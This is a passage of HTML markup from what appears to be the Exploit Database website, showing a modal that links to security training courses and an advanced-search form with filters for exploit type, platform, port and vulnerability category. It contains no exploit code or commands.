                                       target="_blank" rel="noopener">Advanced Attack Simulation
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                                       target="_blank" rel="noopener">Kali Linux Revealed Book
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">OSEP
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">Evasion Techniques and breaching Defences (PEN-300)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#asa"
                                       target="_blank" rel="noopener">Application Security Assessment
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">OSWE
                                    </a>
                                </td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                                       <br />Updated for 2020
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">OSED
                                    </a>
                                </td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                                       <br />All new for 2021
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://www.offensive-security.com/awe-osee/"
                                       target="_blank" rel="noopener">OSEE
                                    </a>
                                </td>
                                <td>
<!--
                                    <a href="https://www.offensive-security.com/metasploit-unleashed/"
                                       target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                                    </a>
-->
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://kali.training/"
                                       target="_blank" rel="noopener">KLCP
                                    </a>
                                </td>
                                <td>
                                    <a href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                                       target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            </tbody>

                        </table>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>

    <!-- Advanced Search Modal -->
<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="searchModalTitle">Search The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">

                    <div class="row">

                        <div class="col-sm-12 col-lg-8">

                            <div class="form-group">

                                <label for="titleSearch" class="control-label text-primary">Title</label>

                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
                                       placeholder="Title" value="" autofocus>

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="cveSearch" class="control-label text-primary">CVE</label>

                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
                                       placeholder="2021-1234"
                                       value="" autofocus>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-6 col-lg-4">

                            <label for="typeSearchSelect" class="text-primary">Type</label>

                            <select id="typeSearchSelect" name="type" class="form-control">

                                <option></option>
                                
                                    <option value="dos" >
                                        dos
                                    </option>


                                
                                    <option value="local" >
                                        local
                                    </option>


                                
                                    <option value="remote" >
                                        remote
                                    </option>


                                
                                    <option value="shellcode" >
                                        shellcode
                                    </option>


                                
                                    <option value="papers" >
                                        papers
                                    </option>


                                
                                    <option value="webapps" >
                                        webapps
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="platformSearchSelect" class="text-primary">Platform</label>

                            <select id="platformSearchSelect" name="platform" class="form-control">

                                <option></option>
                                
                                    <option value="aix" >
                                        AIX
                                    </option>

                                
                                    <option value="asp" >
                                        ASP
                                    </option>

                                
                                    <option value="bsd" >
                                        BSD
                                    </option>

                                
                                    <option value="bsd_ppc" >
                                        BSD_PPC
                                    </option>

                                
                                    <option value="bsd_x86" >
                                        BSD_x86
                                    </option>

                                
                                    <option value="bsdi_x86" >
                                        BSDi_x86
                                    </option>

                                
                                    <option value="cgi" >
                                        CGI
                                    </option>

                                
                                    <option value="freebsd" >
                                        FreeBSD
                                    </option>

                                
                                    <option value="freebsd_x86" >
                                        FreeBSD_x86
                                    </option>

                                
                                    <option value="freebsd_x86-64" >
                                        FreeBSD_x86-64
                                    </option>

                                
                                    <option value="generator" >
                                        Generator
                                    </option>

                                
                                    <option value="hardware" >
                                        Hardware
                                    </option>

                                
                                    <option value="hp-ux" >
                                        HP-UX
                                    </option>

                                
                                    <option value="irix" >
                                        IRIX
                                    </option>

                                
                                    <option value="jsp" >
                                        JSP
                                    </option>

                                
                                    <option value="linux" >
                                        Linux
                                    </option>

                                
                                    <option value="linux_mips" >
                                        Linux_MIPS
                                    </option>

                                
                                    <option value="linux_ppc" >
                                        Linux_PPC
                                    </option>

                                
                                    <option value="linux_sparc" >
                                        Linux_SPARC
                                    </option>

                                
                                    <option value="linux_x86" >
                                        Linux_x86
                                    </option>

                                
                                    <option value="linux_x86-64" >
                                        Linux_x86-64
                                    </option>

                                
                                    <option value="minix" >
                                        MINIX
                                    </option>

                                
                                    <option value="multiple" >
                                        Multiple
                                    </option>

                                
                                    <option value="netbsd_x86" >
                                        NetBSD_x86
                                    </option>

                                
                                    <option value="novell" >
                                        Novell
                                    </option>

                                
                                    <option value="openbsd" >
                                        OpenBSD
                                    </option>

                                
                                    <option value="openbsd_x86" >
                                        OpenBSD_x86
                                    </option>

                                
                                    <option value="osx_ppc" >
                                        OSX_PPC
                                    </option>

                                
                                    <option value="osx" >
                                        OSX
                                    </option>

                                
                                    <option value="php" >
                                        PHP
                                    </option>

                                
                                    <option value="plan9" >
                                        Plan9
                                    </option>

                                
                                    <option value="qnx" >
                                        QNX
                                    </option>

                                
                                    <option value="sco" >
                                        SCO
                                    </option>

                                
                                    <option value="sco_x86" >
                                        SCO_x86
                                    </option>

                                
                                    <option value="solaris" >
                                        Solaris
                                    </option>

                                
                                    <option value="solaris_sparc" >
                                        Solaris_SPARC
                                    </option>

                                
                                    <option value="solaris_x86" >
                                        Solaris_x86
                                    </option>

                                
                                    <option value="tru64" >
                                        Tru64
                                    </option>

                                
                                    <option value="ultrix" >
                                        ULTRIX
                                    </option>

                                
                                    <option value="unix" >
                                        Unix
                                    </option>

                                
                                    <option value="unixware" >
                                        UnixWare
                                    </option>

                                
                                    <option value="windows_x86" >
                                        Windows_x86
                                    </option>

                                
                                    <option value="windows_x86-64" >
                                        Windows_x86-64
                                    </option>

                                
                                    <option value="windows" >
                                        Windows
                                    </option>

                                
                                    <option value="arm" >
                                        ARM
                                    </option>

                                
                                    <option value="cfm" >
                                        CFM
                                    </option>

                                
                                    <option value="netware" >
                                        Netware
                                    </option>

                                
                                    <option value="superh_sh4" >
                                        SuperH_SH4
                                    </option>

                                
                                    <option value="java" >
                                        Java
                                    </option>

                                
                                    <option value="beos" >
                                        BeOS
                                    </option>

                                
                                    <option value="immunix" >
                                        Immunix
                                    </option>

                                
                                    <option value="palm_os" >
                                        Palm_OS
                                    </option>

                                
                                    <option value="atheos" >
                                        AtheOS
                                    </option>

                                
                                    <option value="ios" >
                                        iOS
                                    </option>

                                
                                    <option value="android" >
                                        Android
                                    </option>

                                
                                    <option value="xml" >
                                        XML
                                    </option>

                                
                                    <option value="perl" >
                                        Perl
                                    </option>

                                
                                    <option value="python" >
                                        Python
                                    </option>

                                
                                    <option value="system_z" >
                                        System_z
                                    </option>

                                
                                    <option value="json" >
                                        JSON
                                    </option>

                                
                                    <option value="ashx" >
                                        ASHX
                                    </option>

                                
                                    <option value="ruby" >
                                        Ruby
                                    </option>

                                
                                    <option value="aspx" >
                                        ASPX
                                    </option>

                                
                                    <option value="macos" >
                                        macOS
                                    </option>

                                
                                    <option value="linux_crisv32" >
                                        Linux_CRISv32
                                    </option>

                                
                                    <option value="ezine" >
                                        eZine
                                    </option>

                                
                                    <option value="magazine" >
                                        Magazine
                                    </option>

                                
                                    <option value="nodejs" >
                                        NodeJS
                                    </option>

                                
                                    <option value="alpha" >
                                        Alpha
                                    </option>

                                
                                    <option value="solaris_mips" >
                                        Solaris_MIPS
                                    </option>

                                
                                    <option value="lua" >
                                        Lua
                                    </option>

                                
                                    <option value="watchos" >
                                        watchOS
                                    </option>

                                
                                    <option value="vxworks" >
                                        VxWorks
                                    </option>

                                
                                    <option value="python2" >
                                        Python2
                                    </option>

                                
                                    <option value="python3" >
                                        Python3
                                    </option>

                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="authorSearch" class="text-primary">Author</label>

                                <input id="authorSearch" class="form-control" type="text" name="e_author"
                                       placeholder="Author" value="">

                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-12 col-lg-6">

                            <div class="form-group">

                                <label for="textSearch" class="control-label text-primary">Content</label>

                                <input id="textSearch" class="form-control" type="text" name="text"
                                       placeholder="Exploit content" value="">

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-2">

                            <label for="portSearchSelect" class="text-primary">Port</label>

                            <select id="portSearchSelect" name="port" class="form-control">

                                <option></option>
                                
                                    <option value="14" >
                                        14
                                    </option>


                                
                                    <option value="21" >
                                        21
                                    </option>


                                
                                    <option value="22" >
                                        22
                                    </option>


                                
                                    <option value="23" >
                                        23
                                    </option>


                                
                                    <option value="25" >
                                        25
                                    </option>


                                
                                    <option value="42" >
                                        42
                                    </option>


                                
                                    <option value="49" >
                                        49
                                    </option>


                                
                                    <option value="53" >
                                        53
                                    </option>


                                
                                    <option value="66" >
                                        66
                                    </option>


                                
                                    <option value="69" >
                                        69
                                    </option>


                                
                                    <option value="70" >
                                        70
                                    </option>


                                
                                    <option value="79" >
                                        79
                                    </option>


                                
                                    <option value="80" >
                                        80
                                    </option>


                                
                                    <option value="81" >
                                        81
                                    </option>


                                
                                    <option value="102" >
                                        102
                                    </option>


                                
                                    <option value="105" >
                                        105
                                    </option>


                                
                                    <option value="110" >
                                        110
                                    </option>


                                
                                    <option value="111" >
                                        111
                                    </option>


                                
                                    <option value="113" >
                                        113
                                    </option>


                                
                                    <option value="119" >
                                        119
                                    </option>


                                
                                    <option value="123" >
                                        123
                                    </option>


                                
                                    <option value="135" >
                                        135
                                    </option>


                                
                                    <option value="139" >
                                        139
                                    </option>


                                
                                    <option value="143" >
                                        143
                                    </option>


                                
                                    <option value="161" >
                                        161
                                    </option>


                                
                                    <option value="162" >
                                        162
                                    </option>


                                
                                    <option value="164" >
                                        164
                                    </option>


                                
                                    <option value="383" >
                                        383
                                    </option>


                                
                                    <option value="389" >
                                        389
                                    </option>


                                
                                    <option value="402" >
                                        402
                                    </option>


                                
                                    <option value="406" >
                                        406
                                    </option>


                                
                                    <option value="411" >
                                        411
                                    </option>


                                
                                    <option value="443" >
                                        443
                                    </option>


                                
                                    <option value="444" >
                                        444
                                    </option>


                                
                                    <option value="445" >
                                        445
                                    </option>


                                
                                    <option value="446" >
                                        446
                                    </option>


                                
                                    <option value="502" >
                                        502
                                    </option>


                                
                                    <option value="504" >
                                        504
                                    </option>


                                
                                    <option value="513" >
                                        513
                                    </option>


                                
                                    <option value="514" >
                                        514
                                    </option>


                                
                                    <option value="515" >
                                        515
                                    </option>


                                
                                    <option value="532" >
                                        532
                                    </option>


                                
                                    <option value="548" >
                                        548
                                    </option>


                                
                                    <option value="554" >
                                        554
                                    </option>


                                
                                    <option value="555" >
                                        555
                                    </option>


                                
                                    <option value="617" >
                                        617
                                    </option>


                                
                                    <option value="623" >
                                        623
                                    </option>


                                
                                    <option value="631" >
                                        631
                                    </option>


                                
                                    <option value="655" >
                                        655
                                    </option>


                                
                                    <option value="689" >
                                        689
                                    </option>


                                
                                    <option value="783" >
                                        783
                                    </option>


                                
                                    <option value="787" >
                                        787
                                    </option>


                                
                                    <option value="808" >
                                        808
                                    </option>


                                
                                    <option value="873" >
                                        873
                                    </option>


                                
                                    <option value="888" >
                                        888
                                    </option>


                                
                                    <option value="901" >
                                        901
                                    </option>


                                
                                    <option value="998" >
                                        998
                                    </option>


                                
                                    <option value="1000" >
                                        1000
                                    </option>


                                
                                    <option value="1040" >
                                        1040
                                    </option>


                                
                                    <option value="1089" >
                                        1089
                                    </option>


                                
                                    <option value="1099" >
                                        1099
                                    </option>


                                
                                    <option value="1100" >
                                        1100
                                    </option>


                                
                                    <option value="1114" >
                                        1114
                                    </option>


                                
                                    <option value="1120" >
                                        1120
                                    </option>


                                
                                    <option value="1194" >
                                        1194
                                    </option>


                                
                                    <option value="1235" >
                                        1235
                                    </option>


                                
                                    <option value="1471" >
                                        1471
                                    </option>


                                
                                    <option value="1521" >
                                        1521
                                    </option>


                                
                                    <option value="1533" >
                                        1533
                                    </option>


                                
                                    <option value="1581" >
                                        1581
                                    </option>


                                
                                    <option value="1589" >
                                        1589
                                    </option>


                                
                                    <option value="1604" >
                                        1604
                                    </option>


                                
                                    <option value="1617" >
                                        1617
                                    </option>


                                
                                    <option value="1723" >
                                        1723
                                    </option>


                                
                                    <option value="1743" >
                                        1743
                                    </option>


                                
                                    <option value="1761" >
                                        1761
                                    </option>


                                
                                    <option value="1812" >
                                        1812
                                    </option>


                                
                                    <option value="1858" >
                                        1858
                                    </option>


                                
                                    <option value="1861" >
                                        1861
                                    </option>


                                
                                    <option value="1900" >
                                        1900
                                    </option>


                                
                                    <option value="1947" >
                                        1947
                                    </option>


                                
                                    <option value="2000" >
                                        2000
                                    </option>


                                
                                    <option value="2022" >
                                        2022
                                    </option>


                                
                                    <option value="2049" >
                                        2049
                                    </option>


                                
                                    <option value="2100" >
                                        2100
                                    </option>


                                
                                    <option value="2103" >
                                        2103
                                    </option>


                                
                                    <option value="2121" >
                                        2121
                                    </option>


                                
                                    <option value="2125" >
                                        2125
                                    </option>


                                
                                    <option value="2181" >
                                        2181
                                    </option>


                                
                                    <option value="2242" >
                                        2242
                                    </option>


                                
                                    <option value="2315" >
                                        2315
                                    </option>


                                
                                    <option value="2375" >
                                        2375
                                    </option>


                                
                                    <option value="2380" >
                                        2380
                                    </option>


                                
                                    <option value="2381" >
                                        2381
                                    </option>


                                
                                    <option value="2401" >
                                        2401
                                    </option>


                                
                                    <option value="2480" >
                                        2480
                                    </option>


                                
                                    <option value="2525" >
                                        2525
                                    </option>


                                
                                    <option value="2640" >
                                        2640
                                    </option>


                                
                                    <option value="2810" >
                                        2810
                                    </option>


                                
                                    <option value="2812" >
                                        2812
                                    </option>


                                
                                    <option value="2947" >
                                        2947
                                    </option>


                                
                                    <option value="2954" >
                                        2954
                                    </option>


                                
                                    <option value="2990" >
                                        2990
                                    </option>


                                
                                    <option value="3000" >
                                        3000
                                    </option>


                                
                                    <option value="3030" >
                                        3030
                                    </option>


                                
                                    <option value="3050" >
                                        3050
                                    </option>


                                
                                    <option value="3052" >
                                        3052
                                    </option>


                                
                                    <option value="3128" >
                                        3128
                                    </option>


                                
                                    <option value="3129" >
                                        3129
                                    </option>


                                
                                    <option value="3181" >
                                        3181
                                    </option>


                                
                                    <option value="3200" >
                                        3200
                                    </option>


                                
                                    <option value="3217" >
                                        3217
                                    </option>


                                
                                    <option value="3306" >
                                        3306
                                    </option>


                                
                                    <option value="3333" >
                                        3333
                                    </option>


                                
                                    <option value="3378" >
                                        3378
                                    </option>


                                
                                    <option value="3389" >
                                        3389
                                    </option>


                                
                                    <option value="3460" >
                                        3460
                                    </option>


                                
                                    <option value="3465" >
                                        3465
                                    </option>


                                
                                    <option value="3500" >
                                        3500
                                    </option>


                                
                                    <option value="3535" >
                                        3535
                                    </option>


                                
                                    <option value="3632" >
                                        3632
                                    </option>


                                
                                    <option value="3690" >
                                        3690
                                    </option>


                                
                                    <option value="3790" >
                                        3790
                                    </option>


                                
                                    <option value="3814" >
                                        3814
                                    </option>


                                
                                    <option value="3817" >
                                        3817
                                    </option>


                                
                                    <option value="4000" >
                                        4000
                                    </option>


                                
                                    <option value="4002" >
                                        4002
                                    </option>


                                
                                    <option value="4070" >
                                        4070
                                    </option>


                                
                                    <option value="4081" >
                                        4081
                                    </option>


                                
                                    <option value="4105" >
                                        4105
                                    </option>


                                
                                    <option value="4111" >
                                        4111
                                    </option>


                                
                                    <option value="4322" >
                                        4322
                                    </option>


                                
                                    <option value="4343" >
                                        4343
                                    </option>


                                
                                    <option value="4434" >
                                        4434
                                    </option>


                                
                                    <option value="4501" >
                                        4501
                                    </option>


                                
                                    <option value="4555" >
                                        4555
                                    </option>


                                
                                    <option value="4592" >
                                        4592
                                    </option>


                                
                                    <option value="4661" >
                                        4661
                                    </option>


                                
                                    <option value="4750" >
                                        4750
                                    </option>


                                
                                    <option value="4848" >
                                        4848
                                    </option>


                                
                                    <option value="5000" >
                                        5000
                                    </option>


                                
                                    <option value="5060" >
                                        5060
                                    </option>


                                
                                    <option value="5061" >
                                        5061
                                    </option>


                                
                                    <option value="5080" >
                                        5080
                                    </option>


                                
                                    <option value="5081" >
                                        5081
                                    </option>


                                
                                    <option value="5093" >
                                        5093
                                    </option>


                                
                                    <option value="5151" >
                                        5151
                                    </option>


                                
                                    <option value="5180" >
                                        5180
                                    </option>


                                
                                    <option value="5247" >
                                        5247
                                    </option>


                                
                                    <option value="5250" >
                                        5250
                                    </option>


                                
                                    <option value="5272" >
                                        5272
                                    </option>


                                
                                    <option value="5308" >
                                        5308
                                    </option>


                                
                                    <option value="5432" >
                                        5432
                                    </option>


                                
                                    <option value="5466" >
                                        5466
                                    </option>


                                
                                    <option value="5554" >
                                        5554
                                    </option>


                                
                                    <option value="5555" >
                                        5555
                                    </option>


                                
                                    <option value="5600" >
                                        5600
                                    </option>


                                
                                    <option value="5655" >
                                        5655
                                    </option>


                                
                                    <option value="5666" >
                                        5666
                                    </option>


                                
                                    <option value="5800" >
                                        5800
                                    </option>


                                
                                    <option value="5803" >
                                        5803
                                    </option>


                                
                                    <option value="5814" >
                                        5814
                                    </option>


                                
                                    <option value="5858" >
                                        5858
                                    </option>


                                
                                    <option value="5900" >
                                        5900
                                    </option>


                                
                                    <option value="5984" >
                                        5984
                                    </option>


                                
                                    <option value="6066" >
                                        6066
                                    </option>


                                
                                    <option value="6070" >
                                        6070
                                    </option>


                                
                                    <option value="6080" >
                                        6080
                                    </option>


                                
                                    <option value="6082" >
                                        6082
                                    </option>


                                
                                    <option value="6101" >
                                        6101
                                    </option>


                                
                                    <option value="6112" >
                                        6112
                                    </option>


                                
                                    <option value="6129" >
                                        6129
                                    </option>


                                
                                    <option value="6379" >
                                        6379
                                    </option>


                                
                                    <option value="6502" >
                                        6502
                                    </option>


                                
                                    <option value="6503" >
                                        6503
                                    </option>


                                
                                    <option value="6660" >
                                        6660
                                    </option>


                                
                                    <option value="6667" >
                                        6667
                                    </option>


                                
                                    <option value="7001" >
                                        7001
                                    </option>


                                
                                    <option value="7002" >
                                        7002
                                    </option>


                                
                                    <option value="7070" >
                                        7070
                                    </option>


                                
                                    <option value="7071" >
                                        7071
                                    </option>


                                
                                    <option value="7080" >
                                        7080
                                    </option>


                                
                                    <option value="7100" >
                                        7100
                                    </option>


                                
                                    <option value="7144" >
                                        7144
                                    </option>


                                
                                    <option value="7210" >
                                        7210
                                    </option>


                                
                                    <option value="7272" >
                                        7272
                                    </option>


                                
                                    <option value="7290" >
                                        7290
                                    </option>


                                
                                    <option value="7426" >
                                        7426
                                    </option>


                                
                                    <option value="7443" >
                                        7443
                                    </option>


                                
                                    <option value="7510" >
                                        7510
                                    </option>


                                
                                    <option value="7547" >
                                        7547
                                    </option>


                                
                                    <option value="7649" >
                                        7649
                                    </option>


                                
                                    <option value="7770" >
                                        7770
                                    </option>


                                
                                    <option value="7777" >
                                        7777
                                    </option>


                                
                                    <option value="7778" >
                                        7778
                                    </option>


                                
                                    <option value="7787" >
                                        7787
                                    </option>


                                
                                    <option value="7879" >
                                        7879
                                    </option>


                                
                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
